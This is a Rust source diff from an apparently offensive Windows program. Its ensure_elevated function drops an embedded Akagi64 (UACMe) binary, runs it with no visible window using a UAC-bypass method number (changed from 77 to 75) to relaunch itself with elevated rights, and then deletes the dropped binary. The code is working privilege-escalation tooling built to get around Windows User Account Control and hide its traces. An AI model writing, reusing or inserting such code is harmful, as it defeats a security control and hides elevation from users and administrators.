@@ -3,7 +3,7 @@ use std::{os::windows::process::CommandExt, path::PathBuf, process::Command, tim
 
 use winapi::um::winbase::CREATE_NO_WINDOW;
 
-use crate::{assets::Assets, debug};
+use crate::{assets::Assets, debug, common::ensure_path_and_write};
 /**
  * If already elevated, continues as normal.
  * Otherwise it will use Akagi64 to spawn an escalated version of itself and kill the original process.
@@ -19,16 +19,12 @@ pub fn ensure_elevated() {
 
         /* Extract akagi to file to and execute with the current program as the argument */
 
-        if let Some(parent) = akagi_path.parent() {
-            std::fs::create_dir_all(parent).unwrap();
-        }
-
-        std::fs::write(&akagi_path, akagi_bytes).expect("Could not write akagi binary");
+        ensure_path_and_write(&akagi_path, akagi_bytes).expect("Could not write akagi binary");
 
         debug!("Successfully extracted Akagi binary. Running self with Akagi64.");
 
         Command::new(&akagi_path)
-            .args(["77", std::env::current_exe().unwrap().to_str().unwrap()])
+            .args(["75", std::env::current_exe().unwrap().to_str().unwrap()])
             .creation_flags(CREATE_NO_WINDOW)
             .spawn()
             .expect("Failed to spawn Akagi64");
@@ -45,7 +41,7 @@ pub fn ensure_elevated() {
     while akagi_path.exists() {
         if let Err(e) = std::fs::remove_file(&akagi_path) {
             debug!("Failed to remove Akagi64.exe: {:?}", e);
-            std::thread::sleep(Duration::from_millis(200));
+            std::thread::sleep(Duration::from_millis(500));
             continue;
         };
     }
